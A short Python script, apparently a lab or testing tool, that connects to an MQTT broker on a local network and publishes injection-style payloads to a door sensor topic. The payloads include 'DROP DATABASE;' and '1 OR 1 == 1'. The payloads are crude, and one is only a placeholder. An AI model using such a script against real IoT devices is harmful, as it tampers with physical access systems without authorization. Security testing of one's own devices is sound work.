#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

BROKER = "192.168.1.10"
TOPIC = "iot/sensor/puerta"

client = mqtt.Client()
client.connect(BROKER, 1883, 60)

payloads = [
    "FORMAT_EXPLOIT",
    "DROP DATABASE;",
    "{\"door\": \"hack\"}",
    "1 OR 1 == 1"
]

print("→ Iniciando Injection Puerta MQTT")
for p in payloads:
    client.publish(TOPIC, p)
    print(f"📡 Injection PRT → {p}")
    time.sleep(0.5)
